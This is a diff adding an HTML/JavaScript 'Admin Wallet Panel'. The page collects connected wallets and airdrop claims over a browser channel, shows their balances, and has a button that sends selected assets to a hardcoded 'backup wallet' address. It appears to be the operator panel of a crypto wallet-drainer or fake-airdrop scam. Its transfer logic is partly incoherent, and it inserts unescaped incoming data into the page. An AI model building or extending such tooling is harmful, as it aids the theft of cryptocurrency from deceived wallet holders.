@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Admin Wallet Panel</title>
+  <style>
+    /* Dark background with subtle gradient */
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0a0a23 0%, #1c1c3a 100%);
+      color: #e0e6f8;
+      padding: 20px 40px;
+      margin: 0;
+      min-height: 100vh;
+    }
+
+    h1, h2 {
+      color: #81a9ff;
+      text-shadow: 0 0 10px #3d63ff;
+      margin-bottom: 12px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: separate;
+      border-spacing: 0 10px;
+      margin-bottom: 40px;
+      background: #12122b;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(60, 80, 240, 0.6);
+      overflow: hidden;
+    }
+
+    thead tr {
+      background: #1e1e42;
+      color: #a9b0ff;
+      font-weight: 600;
+      text-transform: uppercase;
+      font-size: 0.9em;
+      letter-spacing: 1px;
+    }
+
+    th, td {
+      padding: 14px 18px;
+      text-align: left;
+      vertical-align: middle;
+    }
+
+    tbody tr {
+      background: #1b1b3d;
+      transition: background 0.3s ease;
+      cursor: default;
+      border-radius: 6px;
+      box-shadow: inset 0 0 8px #23346d;
+    }
+
+    tbody tr:hover {
+      background: #2e2e6d;
+      box-shadow: 0 0 18px #5875ff;
+      color: #d0dcff;
+    }
+
+    /* Scroll horizontally if needed */
+    table {
+      display: block;
+      overflow-x: auto;
+      white-space: nowrap;
+    }
+
+    .toggle {
+      cursor: pointer;
+      width: 18px;
+      height: 18px;
+      margin-right: 8px;
+      accent-color: #5b88ff;
+    }
+
+    /* Asset balances styling */
+    td div {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 6px;
+      font-size: 0.9em;
+      color: #b0bcff;
+    }
+
+    td div img {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      box-shadow: 0 0 6px #3a55ff88;
+    }
+
+    /* Glowing green button */
+    .green-btn {
+      background: linear-gradient(45deg, #4caf50, #1b5e20);
+      color: #dff7d9;
+      border: none;
+      padding: 14px 28px;
+      font-size: 1.1em;
+      font-weight: 600;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow:
+        0 0 10px #4caf50,
+        0 0 20px #4caf50,
+        inset 0 0 8px #2e7d32;
+      transition: box-shadow 0.3s ease, background 0.3s ease;
+      user-select: none;
+      margin-top: 10px;
+      display: inline-block;
+    }
+
+    .green-btn:hover {
+      box-shadow:
+        0 0 20px #6bd36b,
+        0 0 40px #6bd36b,
+        inset 0 0 10px #388e3c;
+      background: linear-gradient(45deg, #66bb6a, #2e7d32);
+    }
+
+    #backupBalance {
+      background: #171734;
+      border-radius: 12px;
+      padding: 18px;
+      box-shadow: 0 0 15px #5875ffaa inset;
+      font-size: 1.1em;
+      font-weight: 600;
+      color: #8db1ff;
+      min-height: 40px;
+      margin-top: 15px;
+      user-select: text;
+    }
+  </style>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+
+<body>
+  <h1>Admin Dashboard</h1>
+
+  <h2>Connected Wallets</h2>
+  <table id="walletTable" aria-label="Connected Wallets">
+    <thead>
+      <tr>
+        <th>Address</th>
+        <th>Wallet Type</th>
+        <th>Network</th>
+        <th>Total Balance</th>
+        <th>Assets</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <h2>Airdrop Claims</h2>
+  <table id="airdropTable" aria-label="Airdrop Claims">
+    <thead>
+      <tr>
+        <th>Wallet Address</th>
+        <th>Asset</th>
+        <th>Network</th>
+        <th>Timestamp</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <h2>Asset Transfer Controls</h2>
+  <div id="transferControls"></div>
+  <button class="green-btn" onclick="transferAssets()">
+    Transfer Selected Assets to Backup Wallet
+  </button>
+
+  <h2>Backup Wallet Balance</h2>
+  <div id="backupBalance">Click transfer to view balance...</div>
+
+  <script>
+    const chan = new BroadcastChannel("admin_channel");
+    let wallets = [];
+    let assetToggles = {};
+    const BACKUP_WALLET = "0xeae9B21a663eBFE22D928BD1207CDED0bd52A02C"; // Replace with actual
+
+    chan.onmessage = (event) => {
+      if (event.data.type === 'wallet') addWalletRow(event.data.data);
+      if (event.data.type === 'airdrop') addAirdropRow(event.data.data);
+    };
+
+    function addWalletRow(data) {
+      const tbody = document.querySelector("#walletTable tbody");
+      const row = document.createElement("tr");
+
+      // Asset checkboxes with logos
+      const assetsHtml = data.assetBalances.map(a => `
+        <div>
+          <input class='toggle' type='checkbox' id='${data.address}-${a.symbol}' checked />
+          <img src='${a.logo || 'https://via.placeholder.com/20'}' alt='${a.symbol} logo' />
+          ${a.symbol}: ${a.balance}
+        </div>
+      `).join("");
+
+      assetToggles[data.address] = data.assetBalances;
+
+      row.innerHTML = `
+        <td title="${data.address}">${data.address}</td>
+        <td>${data.walletType}</td>
+        <td>${data.network}</td>
+        <td>${data.totalBalance}</td>
+        <td>${assetsHtml}</td>
+      `;
+
+      tbody.appendChild(row);
+    }
+
+    function addAirdropRow(data) {
+      const tbody = document.querySelector("#airdropTable tbody");
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td title="${data.address}">${data.address}</td>
+        <td>${data.asset}</td>
+        <td>${data.network}</td>
+        <td>${data.time}</td>
+      `;
+      tbody.appendChild(row);
+    }
+
+    async function fetchBackupTokenBalance(symbol, tokenAddress, decimals = 18) {
+      try {
+        const abi = ["function balanceOf(address) view returns (uint)"];
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const contract = new ethers.Contract(tokenAddress, abi, provider);
+        const balance = await contract.balanceOf(BACKUP_WALLET);
+        return ethers.utils.formatUnits(balance, decimals);
+      } catch (err) {
+        console.error(`Failed to fetch ${symbol} balance`, err);
+        return "0";
+      }
+    }
+
+    async function transferAssets() {
+      if (!window.ethereum) {
+        alert("MetaMask not detected.");
+        return;
+      }
+
+      await ethereum.request({ method: 'eth_requestAccounts' });
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+
+      const selected = [];
+      for (const addr in assetToggles) {
+        assetToggles[addr].forEach(asset => {
+          const id = `${addr}-${asset.symbol}`;
+          if (document.getElementById(id)?.checked) {
+            selected.push({ 
+              address: addr, 
+              symbol: asset.symbol, 
+              balance: asset.balance, 
+              tokenAddress: asset.contractAddress || null 
+            });
+          }
+        });
+      }
+
+      if (selected.length === 0) { 
+        alert("No assets selected for transfer"); 
+        return; 
+      }
+
+      for (const item of selected) {
+        try {
+          if (!item.tokenAddress || item.tokenAddress === 'native') {
+            const tx = await signer.sendTransaction({
+              to: BACKUP_WALLET,
+              value: ethers.utils.parseEther(item.balance.toString())
+            });
+            await tx.wait();
+            console.log(`Transferred native ${item.symbol}:`, tx.hash);
+          } else {
+            const abi = ["function transfer(address to, uint amount) public returns (bool)"];
+            const contract = new ethers.Contract(item.tokenAddress, abi, signer);
+            const decimals = item.symbol === 'USDT' ? 6 : 18;
+            const amount = ethers.utils.parseUnits(Number(item.balance).toFixed(decimals), decimals);
+            const tx = await contract.transfer(BACKUP_WALLET, amount);
+            await tx.wait();
+            console.log(`Transferred ${item.symbol}:`, tx.hash);
+          }
+        } catch (err) {
+          console.error(`Error transferring ${item.symbol}:`, err);
+        }
+      }
+
+      // Fetch and display backup wallet balances
+      try {
+        const balance = await provider.getBalance(BACKUP_WALLET);
+        const eth = ethers.utils.formatEther(balance);
+        let display = `Native: ${eth} ETH/BNB`;
+
+        const tokensToCheck = [
+          { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
+          { symbol: 'BNB',  address: '0xB8c77482e45F1F44dE1745F52C74426C631bdd52', decimals: 18 },
+          { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
+          { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
+        ];
+
+        for (const token of tokensToCheck) {
+          const bal = await fetchBackupTokenBalance(token.symbol, token.address, token.decimals);
+          display += `<br>${token.symbol}: ${bal}`;
+        }
+        document.getElementById("backupBalance").innerHTML = display;
+      } catch (e) {
+        console.error("Failed to fetch backup balance", e);
+        document.getElementById("backupBalance").innerText = "Error fetching balance.";
+      }
+
+      alert("Transfers completed. Check console for transaction hashes.");
+    }
+  </script>
+</body>
+</html>
